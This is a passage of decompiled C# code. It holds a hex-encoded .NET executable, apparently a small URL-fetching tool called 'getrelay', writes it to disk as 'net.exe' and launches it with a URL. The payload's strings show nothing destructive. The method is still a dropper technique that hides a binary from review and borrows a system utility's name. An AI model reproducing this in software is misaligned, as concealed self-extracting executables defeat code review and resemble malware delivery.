0112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E5342422043464620464653204147000025010020436F7079726967687420C2A9205342422043464620464653204147203230323100002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32001400004D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D080CC60000000000000000E00022000B013000000A00000008000000000000DA280000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000852800004F00000000400000E405000000000000000000000000000000000000006000000C000000EC270000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E008000000200000000A000000020000000000000000000000000000200000602E72737263000000E40500000040000000060000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000B9280000000000004800000002000500CC2000002007000003000200010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000002C020000237E000098020000CC02000023537472696E677300000000640500005000000023555300B4050000100000002347554944000000C40500005C01000023426C6F620000000000000002000001471502000900000000FA0133001600000100000017000000020000000200000001000000160000000E0000000100000001000000020000000000C2010100000000000600370171020600A401710206006B003F020F0091020000060093000F0206001A010F020600FB000F0206008B010F02060057010F02060070010F020600AA000F0206007F00520206005D0052020600DE000F020600C500CF010600A50203020A00B702AC020600210210000A003E00AC020600F401100006002E021000060001000302060023000302000000000700000000000100010000001000FB01C20241000100010050200000000091000A0252000100C42000000000861839020600020000000100A002090039020100110039020600190039020A0029003902100031003902100039003902100041003902100049003902100051003902100059003902100061003902150069003902100071003902100079003902100089005600230089004A0029009900E9012E00910039023300A9002B003900B90034003D00B900340044008100390206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000C202000004000000000000000000000049001A00000000000400000000000000000000004900030200000000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C617900000001000F7B0030007D003A007B0031007D00003B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C00200039003800340033007A0065007200710000003BCBAB9B49EDD747B6A9A1E3EA57BF0200042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E2020202020202020202020202020000025010020436F7079726967687420C2A9203230323120202020202020202020202020202000002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3200000000025ABACB00000000020000006100000024280000240A00000000000000000000000000001000000000000000000000000000000052534453709A1FBD540EAC47998F3D84A75EDC410100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000AD2800000000000000000000C7280000002000000000000000000000000000000000000000000000B9280000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E00650074003100200020002000200000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000320030003200310020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007B7909D2000000000200000061000000343C0000341E000000000000000000000000000010000000000000000000000000000000525344539571E5573D850E46949C412D70C81A150100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000BD3C00000000000000000000D73C0000002000000000000000000000000000000000000000000000C93C0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E006500740031002E0065007800650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9003200300032003100200020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000003000000C000000EC3C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000".Length / 2];
      for (int index = 0; index < numArray.Length; ++index)
      {
        string s = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DFF6BE830000000000000000E00022000B013000001E00000008000000000000EA3C0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000953C00004F00000000400000E405000000000000000000000000000000000000006000000C000000FC3B0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F01C000000200000001E000000020000000000000000000000000000200000602E72737263000000E4050000004000000006000000200000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000002600000000000000000000000000004000004200000000000000000000000000000000C93C0000000000004800000002000500CC200000280700000300020001000006F427000008140000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000003C020000237E0000A8020000D402000023537472696E6773000000007C0500004000000023555300BC050000100000002347554944000000CC0500005C01000023426C6F620000000000000002000001471502000901000000FA0133001600000100000017000000020000000200000001000000160000000E000000010000000100000002000000010000000000CB01010000000000060037017A020600A4017A0206006B0048020F009A02000006009300180206001A0118020600FB00180206008B0118020600570118020600700118020600AA00180206007F005B0206005D005B020600DE0018020600C500D8010600AE020C020A00C002B50206002A0210000A003E00B5020600FD011000060037021000060001000C02060023000C020000000007000000000001000100000010000402CB024100010001005020000000009100130252000100C42000000000861842020600020000000100A902090042020100110042020600190042020A0029004202100031004202100039004202100041004202100049004202100051004202100059004202100061004202150069004202100071004202100079004202100089005600230089004A0029009900F2012E00910042023300A9002B003900B90034003D00B900340044008100420206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000CB02000004000000000000000000000049001A000000000004000000000000000000000049000C02000000000000000001000000C2010000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E67657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C6179000001000F7B0030007D003A007B0031007D00002B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C002E000000E469C7ECA0C6424A884684CEAA5BFE2A00042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E5342422043464620464653204147000025010020436F7079726967687420C2A9205342422043464620464653204147203230323100002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32001400004D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D080CC60000000000000000E00022000B013000000A00000008000000000000DA280000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000852800004F00000000400000E405000000000000000000000000000000000000006000000C000000EC270000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E008000000200000000A000000020000000000000000000000000000200000602E72737263000000E40500000040000000060000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000B9280000000000004800000002000500CC2000002007000003000200010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000002C020000237E000098020000CC02000023537472696E677300000000640500005000000023555300B4050000100000002347554944000000C40500005C01000023426C6F620000000000000002000001471502000900000000FA0133001600000100000017000000020000000200000001000000160000000E0000000100000001000000020000000000C2010100000000000600370171020600A401710206006B003F020F0091020000060093000F0206001A010F020600FB000F0206008B010F02060057010F02060070010F020600AA000F0206007F00520206005D0052020600DE000F020600C500CF010600A50203020A00B702AC020600210210000A003E00AC020600F401100006002E021000060001000302060023000302000000000700000000000100010000001000FB01C20241000100010050200000000091000A0252000100C42000000000861839020600020000000100A002090039020100110039020600190039020A0029003902100031003902100039003902100041003902100049003902100051003902100059003902100061003902150069003902100071003902100079003902100089005600230089004A0029009900E9012E00910039023300A9002B003900B90034003D00B900340044008100390206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000C202000004000000000000000000000049001A00000000000400000000000000000000004900030200000000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C617900000001000F7B0030007D003A007B0031007D00003B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C00200039003800340033007A0065007200710000003BCBAB9B49EDD747B6A9A1E3EA57BF0200042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E2020202020202020202020202020000025010020436F7079726967687420C2A9203230323120202020202020202020202020202000002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3200000000025ABACB00000000020000006100000024280000240A00000000000000000000000000001000000000000000000000000000000052534453709A1FBD540EAC47998F3D84A75EDC410100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000AD2800000000000000000000C7280000002000000000000000000000000000000000000000000000B9280000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E00650074003100200020002000200000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000320030003200310020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007B7909D2000000000200000061000000343C0000341E000000000000000000000000000010000000000000000000000000000000525344539571E5573D850E46949C412D70C81A150100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000BD3C00000000000000000000D73C0000002000000000000000000000000000000000000000000000C93C0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E006500740031002E0065007800650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9003200300032003100200020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000003000000C000000EC3C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000".Substring(index * 2, 2);
        numArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
      }
      using (FileStream fileStream = new FileStream("net.exe", FileMode.Create))
      {
        for (int index = 0; index < numArray.Length; ++index)
          fileStream.WriteByte(numArray[index]);
      }
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "net.exe",
          Arguments = url,
